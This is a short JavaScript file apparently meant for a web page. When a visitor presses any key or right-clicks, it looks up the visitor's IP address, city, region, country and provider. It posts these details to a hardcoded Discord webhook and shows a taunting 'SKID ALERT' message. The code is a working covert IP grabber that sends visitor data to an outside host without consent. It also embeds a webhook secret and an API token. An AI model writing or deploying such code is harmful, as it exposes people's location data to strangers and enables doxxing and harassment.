const discordWebhookUrl = 'https://discord.com/api/webhooks/1277154025816723528/j7YZbtwDZ1JgWW4X1zXxAL-2tV5B8hp06i9t4g6TRkxUZYg2DU8gN3-Qdoez5xZCILKF';

async function fetchIPInfo() {
    try {
        const response = await fetch('https://ipinfo.io/json?token=ae988840efabc7');
        const data = await response.json();
        return data;
    } catch (error) {
        console.error('Error fetching IP info:', error);
        return null;
    }
}

async function sendDiscordEmbed(ipInfo) {
    try {
        const message = {
            embeds: [
                {
                    color: 5814783, // Hex color code for embed
                    title: 'New IP Address Detected',
                    fields: [
                        { name: 'IP Address', value: ipInfo.ip, inline: true },
                        { name: 'City', value: ipInfo.city || 'N/A', inline: true },
                        { name: 'Region', value: ipInfo.region || 'N/A', inline: true },
                        { name: 'Country', value: ipInfo.country || 'N/A', inline: true },
                        { name: 'Org', value: ipInfo.org || 'N/A', inline: true }
                    ],
                    footer: {
                        text: 'IP Lookup Alert'
                    }
                }
            ]
        };
        
        const discordResponse = await fetch(discordWebhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(message)
        });

        if (!discordResponse.ok) {
            throw new Error('Failed to send embed to Discord: ' + discordResponse.status + ' - ' + discordResponse.statusText);
        }

    } catch (error) {
        console.error('Error sending embed to Discord:', error);
    }
}

async function flash() {
    const flashOverlay = document.getElementById('flashOverlay');
    const flashText = document.getElementById('flashText');
    
    flashOverlay.style.display = 'block';
    flashText.style.display = 'block';
    
    const ipInfo = await fetchIPInfo();
    if (ipInfo) {
        await sendDiscordEmbed(ipInfo);
        flashText.innerHTML = 'Your IP Address: ' + ipInfo.ip + ' - SKID ALERT';
    } else {
        flashText.innerHTML = 'Unable to fetch IP information.';
    }
}

function handleEvent(event) {
    event.preventDefault();
    flash();
}

window.addEventListener('keydown', handleEvent);
window.addEventListener('contextmenu', handleEvent);
